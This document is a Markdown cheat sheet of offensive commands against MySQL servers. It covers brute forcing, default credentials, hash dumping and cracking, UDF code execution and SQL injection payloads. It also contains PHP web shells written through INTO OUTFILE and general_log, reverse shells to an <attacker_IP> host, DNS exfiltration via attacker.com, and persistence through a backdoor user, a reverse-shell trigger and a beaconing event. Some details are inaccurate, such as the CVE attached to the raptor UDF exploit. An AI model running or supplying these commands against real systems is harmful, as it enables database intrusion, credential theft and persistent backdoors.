# MYSQL ENUMERATION (Port 3306)

## PORT OVERVIEW
```
Port 3306 - MySQL (default)
Port 33060 - MySQL X Protocol
```

## BANNER GRABBING & VERSION DETECTION
```bash
nmap -sV -p3306 <IP>                            # Service/Version detection
nmap -p3306 --script mysql-info <IP>            # MySQL info
nc -nv <IP> 3306                                # Manual connection attempt
telnet <IP> 3306                                # Banner grab
```

## NMAP MYSQL ENUMERATION
```bash
nmap --script "mysql-*" -p3306 <IP>             # All MySQL scripts
nmap --script mysql-info -p3306 <IP>            # Server information
nmap --script mysql-brute -p3306 <IP>           # Brute force
nmap --script mysql-empty-password -p3306 <IP>  # Test for empty password
nmap --script mysql-enum -p3306 <IP>            # Enumerate users
nmap --script mysql-databases --script-args mysqluser=root,mysqlpass=password -p3306 <IP>
nmap --script mysql-variables --script-args mysqluser=root,mysqlpass=password -p3306 <IP>
nmap --script mysql-audit --script-args mysql-audit.username=root,mysql-audit.password=password -p3306 <IP>
```

## MYSQL CLIENT (DIRECT CONNECTION)
```bash
# Connect to MySQL
mysql -h <IP> -u root                           # Default user, no password
mysql -h <IP> -u root -p                        # Prompt for password
mysql -h <IP> -u <USER> -p<PASSWORD>            # With password (no space!)
mysql -h <IP> -u <USER> -p<PASSWORD> -D <DATABASE>  # Specific database

# Common commands after connection
SHOW DATABASES;                                 # List databases
USE <database>;                                 # Switch database
SHOW TABLES;                                    # List tables
DESCRIBE <table>;                               # Show table structure
SELECT @@version;                               # MySQL version
SELECT user();                                  # Current user
SELECT database();                              # Current database
\q                                              # Quit
```

## AUTHENTICATION TESTING
```bash
# Test for default credentials
mysql -h <IP> -u root                           # Empty root password
mysql -h <IP> -u root -proot                    # root:root
mysql -h <IP> -u root -ppassword                # root:password
mysql -h <IP> -u root -ptoor                    # root:toor

# Common default credentials
root: (empty)
root:root
root:password
root:toor
root:admin
admin:admin
mysql:mysql
```

## BRUTE FORCE ATTACKS
```bash
# Hydra
hydra -l root -P passwords.txt mysql://<IP>     # Single user
hydra -L users.txt -P passwords.txt mysql://<IP>  # User/pass lists
hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://<IP>

# Medusa
medusa -h <IP> -u root -P passwords.txt -M mysql
medusa -h <IP> -U users.txt -P passwords.txt -M mysql

# Nmap
nmap --script mysql-brute -p3306 <IP>
nmap --script mysql-brute --script-args userdb=users.txt,passdb=pass.txt -p3306 <IP>

# Patator
patator mysql_login host=<IP> user=FILE0 password=FILE1 0=users.txt 1=passwords.txt
```

## ENUMERATE DATABASES
```bash
# After authentication
SHOW DATABASES;                                 # List all databases
SELECT schema_name FROM information_schema.schemata;  # Alternative

# Switch to database
USE <database>;

# List tables
SHOW TABLES;
SELECT table_name FROM information_schema.tables WHERE table_schema='<database>';

# List columns
SHOW COLUMNS FROM <table>;
SELECT column_name FROM information_schema.columns WHERE table_name='<table>';

# Count records
SELECT COUNT(*) FROM <table>;
```

## ENUMERATE USERS & PRIVILEGES
```bash
# List users
SELECT user, host FROM mysql.user;              # All users
SELECT user, authentication_string FROM mysql.user;  # Users with hashes

# Current user privileges
SHOW GRANTS;
SHOW GRANTS FOR CURRENT_USER;

# Check specific user privileges
SHOW GRANTS FOR 'root'@'localhost';
SELECT * FROM mysql.user WHERE user='root'\G    # Detailed user info

# Check for FILE privilege (file read/write)
SELECT user, file_priv FROM mysql.user WHERE file_priv='Y';

# Check for SUPER privilege
SELECT user, super_priv FROM mysql.user WHERE super_priv='Y';
```

## EXTRACT DATA
```bash
# Dump data from tables
SELECT * FROM <table>;                          # Dump entire table
SELECT username,password FROM users;            # Specific columns

# Search for sensitive data
SELECT table_name FROM information_schema.tables WHERE table_name LIKE '%user%';
SELECT table_name FROM information_schema.tables WHERE table_name LIKE '%password%';
SELECT table_name FROM information_schema.tables WHERE table_name LIKE '%credit%';

# Extract password hashes
SELECT user, authentication_string FROM mysql.user;  # MySQL 5.7+
SELECT user, password FROM mysql.user;          # MySQL 5.6 and earlier
```

## COMMAND EXECUTION (UDF)
```bash
# MySQL User Defined Functions (UDF) allow code execution
# Requires FILE privilege and write access to plugin directory

# Check plugin directory
SHOW VARIABLES LIKE 'plugin_dir';               # Usually /usr/lib/mysql/plugin/

# Load malicious UDF library (Linux)
# First, upload lib_mysqludf_sys.so to plugin directory
SELECT binary 0x<HEX_SHELLCODE> INTO DUMPFILE '/usr/lib/mysql/plugin/lib_mysqludf_sys.so';

# Create UDF functions
CREATE FUNCTION sys_exec RETURNS int SONAME 'lib_mysqludf_sys.so';
CREATE FUNCTION sys_eval RETURNS string SONAME 'lib_mysqludf_sys.so';

# Execute OS commands
SELECT sys_exec('whoami');
SELECT sys_eval('whoami');
SELECT sys_exec('bash -c "bash -i >& /dev/tcp/<attacker_IP>/4444 0>&1"');

# Metasploit module for UDF exploitation
msfconsole -q -x "use exploit/multi/mysql/mysql_udf_payload; set RHOSTS <IP>; set USERNAME root; set PASSWORD password; run"
```

## FILE OPERATIONS (LOAD_FILE / INTO OUTFILE)
```bash
# Read files (requires FILE privilege)
SELECT LOAD_FILE('/etc/passwd');                # Read file
SELECT LOAD_FILE('/var/www/html/config.php');   # Read web config
SELECT LOAD_FILE('C:\\Windows\\win.ini');       # Windows

# Write files (requires FILE privilege and secure_file_priv not set)
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
SELECT 'SSH_KEY_CONTENT' INTO OUTFILE '/root/.ssh/authorized_keys';

# Check secure_file_priv setting
SHOW VARIABLES LIKE 'secure_file_priv';         # Empty = unrestricted, NULL = disabled

# Write web shell via SQL injection
' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php' -- -
```

## PRIVILEGE ESCALATION
```bash
# Check current user privileges
SELECT user();
SELECT current_user();
SELECT * FROM mysql.user WHERE user=SUBSTRING_INDEX(USER(),'@',1)\G

# Create new user with all privileges
CREATE USER 'backdoor'@'%' IDENTIFIED BY 'Password123!';
GRANT ALL PRIVILEGES ON *.* TO 'backdoor'@'%' WITH GRANT OPTION;
FLUSH PRIVILEGES;

# Grant FILE privilege (for file read/write)
GRANT FILE ON *.* TO 'user'@'localhost';
FLUSH PRIVILEGES;

# Change root password (requires root access)
UPDATE mysql.user SET authentication_string=PASSWORD('newpass') WHERE user='root';
UPDATE mysql.user SET password=PASSWORD('newpass') WHERE user='root';  # MySQL 5.6
FLUSH PRIVILEGES;

# MySQL 5.7+ change password
ALTER USER 'root'@'localhost' IDENTIFIED BY 'newpass';
```

## HASH DUMPING & CRACKING
```bash
# Dump password hashes
SELECT user, authentication_string FROM mysql.user;  # MySQL 5.7+
SELECT user, password FROM mysql.user;          # MySQL 5.6 and earlier

# Export hashes to file (from MySQL shell)
SELECT CONCAT(user,':',authentication_string) FROM mysql.user INTO OUTFILE '/tmp/hashes.txt';

# Crack MySQL hashes
hashcat -m 300 hashes.txt rockyou.txt           # MySQL4.1/MySQL5 (SHA-1)
john --format=mysql-sha1 hashes.txt             # John the Ripper
hashcat -m 7401 hashes.txt rockyou.txt          # MySQL 8.0 (caching_sha2_password)
```

## SQLI TO RCE (WEB APPLICATION)
```bash
# If SQL injection exists in web app

# Read files
' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL -- -

# Write web shell
' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php' -- -

# Check for FILE privilege
' UNION SELECT file_priv FROM mysql.user WHERE user='root' -- -

# Extract database credentials
' UNION SELECT LOAD_FILE('/var/www/html/config.php') -- -
```

## RAPTOR UDF EXPLOIT (CVE-2016-6662)
```bash
# MySQL privilege escalation via UDF
# Requires MySQL running as root and FILE privilege

# Download raptor_udf2.c exploit
searchsploit -m 1518                            # MySQL UDF Dynamic Library
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc

# Upload to plugin directory
mysql -u root -p -e "SELECT binary 0x<HEX> INTO DUMPFILE '/usr/lib/mysql/plugin/raptor_udf2.so';"

# Create UDF
mysql -u root -p -e "CREATE FUNCTION do_system RETURNS INTEGER SONAME 'raptor_udf2.so';"

# Execute commands as root
mysql -u root -p -e "SELECT do_system('chmod +s /bin/bash');"
```

## METASPLOIT MODULES
```bash
msfconsole
use auxiliary/scanner/mysql/mysql_version       # Version detection
use auxiliary/scanner/mysql/mysql_login         # Login scanner
use auxiliary/admin/mysql/mysql_enum            # Enumerate MySQL
use auxiliary/admin/mysql/mysql_sql             # Execute SQL query
use auxiliary/scanner/mysql/mysql_hashdump      # Dump password hashes
use auxiliary/scanner/mysql/mysql_schemadump    # Dump database schema
use exploit/multi/mysql/mysql_udf_payload       # UDF payload execution
use exploit/linux/mysql/mysql_yassl_getname     # CVE-2010-2484
use exploit/linux/mysql/mysql_yassl_hello       # CVE-2008-0226
```

## MYSQL CONFIGURATION FILES
```bash
# Common config file locations
/etc/mysql/my.cnf                               # Debian/Ubuntu
/etc/my.cnf                                     # RedHat/CentOS
C:\ProgramData\MySQL\MySQL Server *\my.ini      # Windows
C:\Program Files\MySQL\MySQL Server *\my.ini    # Windows alternative

# Read config from MySQL
SHOW VARIABLES;                                 # All variables
SHOW VARIABLES LIKE '%datadir%';                # Data directory
SHOW VARIABLES LIKE '%plugin_dir%';             # Plugin directory
SHOW VARIABLES LIKE '%secure_file_priv%';       # File access restrictions

# Important variables for exploitation
SHOW VARIABLES LIKE '%version%';                # MySQL version
SHOW VARIABLES LIKE '%log%';                    # Log files location
```

## MYSQL LOGS
```bash
# Find log files
SHOW VARIABLES LIKE '%log%';

# Read general query log (if enabled)
SHOW VARIABLES LIKE 'general_log_file';
SELECT LOAD_FILE('/var/log/mysql/mysql.log');

# Enable general log to write files
SET GLOBAL general_log = 'ON';
SET GLOBAL general_log_file = '/var/www/html/shell.php';
SELECT '<?php system($_GET["cmd"]); ?>';        # Writes to log file
```

## MYSQL REPLICATION
```bash
# Check if server is replication master/slave
SHOW MASTER STATUS;                             # Master status
SHOW SLAVE STATUS\G                             # Slave status

# Enumerate replication users
SELECT user, host FROM mysql.user WHERE Repl_slave_priv='Y';

# If slave, extract master credentials
SHOW SLAVE STATUS\G                             # Look for Master_User, Master_Password
```

## MYSQL INJECTION ADVANCED
```bash
# Time-based blind injection
' AND SLEEP(5) -- -
' AND (SELECT COUNT(*) FROM users WHERE password LIKE 'a%') AND SLEEP(5) -- -

# Boolean-based blind injection
' AND 1=1 -- -                                  # True
' AND 1=2 -- -                                  # False

# Union-based injection
' UNION SELECT NULL,NULL,NULL -- -              # Determine column count
' UNION SELECT user(),database(),version() -- - # Extract info

# Error-based injection
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e)) -- -
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user()),0x7e),1) -- -

# Out-of-band exfiltration (Windows)
' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.attacker.com\\share')) -- -
```

## PERSISTENCE
```bash
# Create backdoor user
CREATE USER 'backdoor'@'%' IDENTIFIED BY 'Password123!';
GRANT ALL PRIVILEGES ON *.* TO 'backdoor'@'%' WITH GRANT OPTION;
FLUSH PRIVILEGES;

# Backdoor via trigger (runs on specific table activity)
CREATE TRIGGER backdoor_trigger BEFORE INSERT ON users FOR EACH ROW
BEGIN
  DECLARE cmd VARCHAR(255);
  SET cmd = 'bash -c "bash -i >& /dev/tcp/<attacker_IP>/4444 0>&1"';
  SELECT sys_exec(cmd);
END;

# Backdoor via event scheduler (runs periodically)
SET GLOBAL event_scheduler = ON;
CREATE EVENT backdoor_event
ON SCHEDULE EVERY 1 HOUR
DO SELECT sys_exec('curl http://<attacker>/beacon');
```

## COMMON MISCONFIGURATIONS
```
☐ Root user with weak/default password
☐ MySQL exposed to internet (bind-address = 0.0.0.0)
☐ Anonymous users enabled
☐ FILE privilege granted to low-privileged users
☐ secure_file_priv not set (allows file read/write anywhere)
☐ Plugin directory writable
☐ MySQL running as root
☐ Old MySQL version (known CVEs)
☐ No firewall rules
☐ Logging disabled
```

## QUICK WIN CHECKLIST
```
☐ Test for empty root password
☐ Test default credentials (root:root, root:password)
☐ Brute force weak passwords
☐ Check MySQL version for known CVEs
☐ Check for FILE privilege
☐ Test LOAD_FILE() for file read
☐ Test INTO OUTFILE for file write
☐ Dump password hashes
☐ Search for sensitive data in databases
☐ Test for SQL injection in web apps
☐ Check if plugin directory is writable (UDF)
```

## ONE-LINER FULL ENUMERATION
```bash
# Quick MySQL enumeration
nmap -sV -p3306 --script mysql-info,mysql-empty-password <IP>

# With credentials
mysql -h <IP> -u root -ppassword -e "SELECT @@version; SHOW DATABASES; SELECT user FROM mysql.user; SHOW VARIABLES LIKE '%plugin_dir%';"

# Dump all databases
mysqldump -h <IP> -u root -ppassword --all-databases > dump.sql
```

## ADVANCED TECHNIQUES
```bash
# MySQL as a pivot point
# Use SELECT ... INTO OUTFILE to write SSH keys

# Extract data via DNS (if outbound DNS allowed)
SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.attacker.com\\share'));

# Blind injection with binary search
# Extract data one bit at a time using timing attacks

# MySQL UDF reverse shell
SELECT sys_exec('bash -c "bash -i >& /dev/tcp/<attacker_IP>/4444 0>&1"');

# Bypass secure_file_priv via general_log
SET GLOBAL general_log_file = '/var/www/html/shell.php';
SET GLOBAL general_log = 'ON';
SELECT '<?php system($_GET["cmd"]); ?>';
SET GLOBAL general_log = 'OFF';
```

## POST-EXPLOITATION (AFTER MYSQL ACCESS)
```bash
# After gaining MySQL access:
1. Check privileges (FILE, SUPER, etc.)
2. Enumerate databases and tables
3. Extract sensitive data (passwords, PII, credit cards)
4. Dump password hashes (crack offline)
5. Test LOAD_FILE() to read sensitive files (config files, SSH keys)
6. Test INTO OUTFILE to write web shell
7. Check if plugin directory is writable (UDF exploitation)
8. Create persistence (backdoor user, triggers, events)
9. Pivot to other systems (credentials reuse)

# Full database dump
mysqldump -h <IP> -u root -ppassword --all-databases > all_databases.sql
mysqldump -h <IP> -u root -ppassword <database> > database.sql

# Extract to CSV
mysql -h <IP> -u root -ppassword -D <database> -e "SELECT * FROM users" | sed 's/\t/,/g' > users.csv
```
